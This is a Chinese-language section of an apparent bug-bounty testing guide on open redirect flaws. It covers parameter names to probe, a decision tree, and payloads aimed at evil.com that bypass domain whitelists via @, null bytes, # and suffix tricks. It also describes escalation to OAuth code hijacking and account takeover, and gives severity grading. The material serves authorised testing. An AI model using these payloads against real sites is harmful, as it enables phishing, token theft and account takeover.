# §24 Open Redirect
### 识别信号
- 参数：`redirect` `next` `return` `goto` `redirectUrl` `redirect_uri` `callback` `target` `continue` `back`
- 302/301 响应码 + `Location` 头指向参数指定的 URL
- 登录/退出/OAuth/支付回调页面（天然需要跳转的流程）

### 决策流程
```
发现重定向参数?
├── Step 1: 基础验证
│   → ?redirect=https://evil.com → 302 Location: https://evil.com → Open Redirect ✅
│   → ?redirect=//evil.com → 302 Location: //evil.com (协议相对URL) → ✅
│   → ?redirect=\evil.com → 302 Location: \evil.com (反斜杠, 部分浏览器解析为 //) → ✅
│
├── Step 2: 白名单绕过 (如果基础验证被拦)
│   → ?redirect=https://target.com.evil.com (后缀匹配绕过)
│   → ?redirect=https://evil.com/target.com (路径包含目标域)
│   → ?redirect=https://target.com@evil.com (@ 绕过)
│   → ?redirect=https://target.com%00.evil.com (空字节截断)
│   → ?redirect=https://evil.com%23target.com (# 截断)
│
├── Step 3: OAuth 场景升级
│   → Open Redirect + OAuth → redirect_uri 白名单绕过 → 劫持 authorization code → 账户接管
│   → 参照 §22 OAuth/SSO
│
└── Step 4: 危害评估
    → 钓鱼(phishing): 用户点击 target.com 链接 → 跳转到钓鱼页面 → 输入凭据
    → Token泄露: 302 跳转时浏览器携带 Referer → 第三方站点看到 token/session
    → OAuth升级: 结合 redirect_uri → 高危
    → 无OAuth结合、无token泄露 → 低危/中危 (取决于钓鱼可利用性)
```

### Payload
```
基础跳转测试:
  ?redirect=https://evil.com
  ?redirect=//evil.com
  ?redirect=\\evil.com
  ?redirect=https:evil.com

白名单绕过:
  ?redirect=https://target.com.evil.com
  ?redirect=https://evil.com#target.com
  ?redirect=https://evil.com?target.com
  ?redirect=https://target.com@evil.com
  ?redirect=javascript:alert(1)  (少数场景)
```

### SRC合规
```
严重度:
  Open Redirect + OAuth → redirect_uri bypass → 高危
  可窃取token/session的302跳转 → 中危
  纯钓鱼场景(用户需交互) → 低危
  无实际影响的跳转 → 忽略
```

---
